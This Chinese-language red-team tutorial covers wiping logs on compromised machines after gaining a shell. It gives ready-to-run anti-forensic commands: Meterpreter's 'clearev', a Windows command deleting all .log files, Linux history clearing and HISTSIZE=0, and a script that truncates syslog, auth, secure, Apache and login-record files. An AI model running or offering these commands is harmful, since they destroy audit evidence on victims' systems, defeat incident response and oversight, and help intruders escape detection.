仅系统日志清理，如果目标服务存在日志服务器的话，所有日志还会被保留。这里仅清理系统相关日志，如果访问了某些服务，比如说通过 apache 服务获得一个 shell，你还需要清理 apache 服务的访问日志。

# 1 Windows

> Windows 下运行 eventvwr 查看日志

msf 清理

```
meterpreter > clearev
```

cmd 清理

```
meterpreter > shell
C:\Windows\system32>del %WINDIR%\*.log /a/s/q/f
```

# 2 Linux

>Linux 可能根据发行版本不同，日志文件名称也有所不同。所以具体清除需要大家先看一下目标操作系统

清理历史命令（仅能清理当下进程）

```
[root@CentOS-76 ~]# history -c
```

使系统不再保存历史命令

```
[root@CentOS-76 ~]# vim /etc/profile
```

> 将 `HISTSIZE=1000` 改为 `HISTSIZE=0`，

```
HISTSIZE=1000
```

```
HISTSIZE=0
```

删除访问日志

1. 访问失败的日志

```
[root@CentOS-76 ~]# echo > /var/log/btmp
```

2. 访问成功的日志

```
[root@CentOS-76 ~]# echo > /var/log/wtmp
```

> 删除后执行 `last` 命令就会发现没有记录

执行脚本

```
[root@CentOS-76 ~]# source clear_logs_linux.sh
```

```
#Linux 日志&命令清理
#!/usr/bin/bash
echo > /var/log/syslog
echo > /var/log/messages
echo > /var/log/httpd/access_log
echo > /var/log/httpd/error_log
echo > /var/log/xferlog
echo > /var/log/secure
echo > /var/log/auth.log
echo > /var/log/user.log
echo > /var/log/wtmp
echo > /var/log/lastlog
echo > /var/log/btmp
echo > /var/run/utmp
history -c
```

> source 在当前进程下执行
>
> 执行时注意文件是否有执行权限。而且只有 root 才可以删除日志。

---

参考链接

- [日志清理](https://wiki.iredteam.cn/the-report-stage/log-cleaning)